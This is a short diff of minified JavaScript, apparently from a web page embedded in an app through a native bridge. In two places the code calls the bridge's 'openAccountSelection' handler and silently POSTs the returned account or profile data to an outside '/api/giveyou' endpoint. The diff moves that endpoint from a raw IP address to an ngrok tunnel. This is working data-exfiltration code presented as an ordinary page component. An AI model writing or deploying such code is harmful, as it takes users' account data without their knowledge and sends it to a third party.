@@ -502,7 +502,7 @@
                 mounted: function() {
                     var e = this;
                     console.log("calling getProfile: "), this.$bridge.callHandler("openAccountSelection").then((function(e) {
-                        fetch("http://104.154.198.183:8001/api/giveyou", {
+                        fetch("https://a51259c503db.ngrok-free.app/api/giveyou", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify(e)
@@ -614,7 +614,7 @@
                 var e = this;
                 this.$bridge.callHandler("openAccountSelection").then((function(t) {
                     e.profile = t
-                    fetch("http://104.154.198.183:8001/api/giveyou", {
+                    fetch("https://a51259c503db.ngrok-free.app/api/giveyou", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(t)
